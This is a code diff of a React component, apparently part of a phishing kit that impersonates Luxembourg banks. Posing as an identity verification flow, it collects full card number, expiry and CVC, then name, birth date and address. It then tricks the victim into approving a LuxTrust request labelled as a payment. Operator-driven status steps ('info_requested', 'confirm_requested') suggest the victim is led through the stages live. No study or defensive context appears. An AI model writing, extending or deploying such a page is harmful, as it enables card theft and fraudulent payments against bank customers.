+              <span className="text-[11px] font-extrabold uppercase tracking-[0.2em] opacity-70">{bank.short}</span>
+            </div>
+            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{fmtNum(card.number) || "•••• •••• •••• ••••"}</p>
+            <div className="mt-2 flex items-end justify-between text-[11px]">
+              <span className="uppercase tracking-wider opacity-70">{card.holder || "CARD HOLDER"}</span>
+              <span className="font-mono">{card.exp || "MM/YY"}</span>
+            </div>
+          </div>
+          <label className="block min-w-0">
+            <span className={labelCls}>Card holder</span>
+            <span className="relative mt-2 block">
+              <LeadIcon d={P.user} />
+              <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="cc-name" className={`uppercase ${inputCls(errs.holder)}`} />
+            </span>
+            {errs.holder && <span className={errCls}>⚠ {errs.holder}</span>}
+          </label>
+          <label className="block min-w-0">
+            <span className={labelCls}>Card number</span>
+            <span className="relative mt-2 block">
+              <LeadIcon d={P.card} />
+              <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="cc-number" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
+            </span>
+            {errs.number && <span className={errCls}>⚠ {errs.number}</span>}
+          </label>
+          <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
+            <label className="block min-w-0">
+              <span className={labelCls}>Expiry</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.cal} />
+                <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="cc-exp" className={`font-mono ${inputCls(errs.exp)}`} />
+              </span>
+              {errs.exp && <span className={errCls}>⚠ {errs.exp}</span>}
+            </label>
+            <label className="block min-w-0">
+              <span className={labelCls}>CVC</span>
+              <span className="relative mt-2 block">
+                <LeadIcon d={P.lock} />
+                <input value={card.cvc} onChange={(e) => setCard({ ...card, cvc: e.target.value.replace(/\D/g, "").slice(0, 4) })} placeholder="123" inputMode="numeric" autoComplete="cc-csc" className={`font-mono ${inputCls(errs.cvc)}`} />
+              </span>
+              {errs.cvc && <span className={errCls}>⚠ {errs.cvc}</span>}
+            </label>
+          </div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Save card & Continue →</PrimaryBtn></div>
+        </form>
+      </Shell>
+    );
+  }
+
+  /* ---------- INFO ---------- */
+  if (status === "info_requested") {
+    const e = {
+      first: t6 && !info.first.trim() ? "Required." : "",
+      last: t6 && !info.last.trim() ? "Required." : "",
+      dob: t6 && !info.dob ? "Required." : "",
+      address: t6 && !info.address.trim() ? "Required." : "",
+      zip: t6 && !info.zip.trim() ? "Required." : "",
+      city: t6 && !info.city.trim() ? "Required." : "",
+    };
+    const ok = info.first.trim() && info.last.trim() && info.dob && info.address.trim() && info.zip.trim() && info.city.trim();
+    const set = (k) => (ev) => setInfo({ ...info, [k]: ev.target.value });
+    return (
+      <Shell bank={bank} step={6} kicker="Personal info" title="Confirm your personal details" desc="Please fill in your name, birth date and address exactly as registered with your bank.">
+        <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
+          <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
+            <label className="block min-w-0"><span className={labelCls}>First name</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="John" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Last name</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Doe" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
+          </div>
+          <label className="block min-w-0"><span className={labelCls}>Date of birth</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input type="date" value={info.dob} onChange={set("dob")} className={`pl-11 ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Address</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Street + number" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
+          <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
+            <label className="block min-w-0"><span className={labelCls}>ZIP</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>City</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
+          </div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Save & Continue →</PrimaryBtn></div>
+        </form>
+      </Shell>
+    );
+  }
+
+  /* ---------- CONFIRM ---------- */
+  if (status === "confirm_requested") {
+    return (
+      <Shell
+        bank={bank}
+        step={7}
+        kicker="Final confirmation"
+        title="Approve to finalize"
+        desc="Please approve the final verification request in your LuxTrust app to keep your access active."
+      >
+        <ApproveVisual bank={bank} />
+        <div className="mt-4 w-full rounded-2xl border p-4 text-[13px] sm:p-4" style={{ borderColor: bank.color + "44", background: `linear-gradient(180deg, ${bank.color}12, ${bank.color}06)` }}>
+          <p className="font-bold text-neutral-800">Verification summary</p>
+          <p className="mt-1 break-words text-neutral-600">
+            {bank.name} • User <b className="font-mono break-all">{userId.toUpperCase()}</b> • {info.first} {info.last} • {phone && `+352 ${phone}`}
+          </p>
+        </div>
+        <div className="mt-4 w-full space-y-2.5">
+          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "done")}>
+            ✓ I&apos;ve approved the payment
+          </PrimaryBtn>
+        </div>
+      </Shell>
+    );
+  }
+
+  /* ---------- DONE ---------- */
+  return (
+    <Shell
+      bank={bank}
+      step={7}
+      kicker="Finished"
+      title="Verification complete"
+      desc="Thank you. Your session is complete."
+    >
+      <div className="w-full rounded-xl border border-green-200 bg-green-50 p-4 text-center sm:p-6">
+        <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-2xl text-white">✓</div>
+        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">Verification complete</p>
+        <p className="mt-1 text-[13px] text-neutral-600 sm:text-[13.5px]">
+          Thank you. Your {bank.name} identity has been verified.
+        </p>
+        <button onClick={goHome} className="mt-4 min-h-[48px] w-full rounded-lg bg-neutral-900 px-4 py-3 text-[14px] font-bold text-white active:bg-neutral-800">
+          ← Back
+        </button>
+      </div>
+    </Shell>
+  );
+}
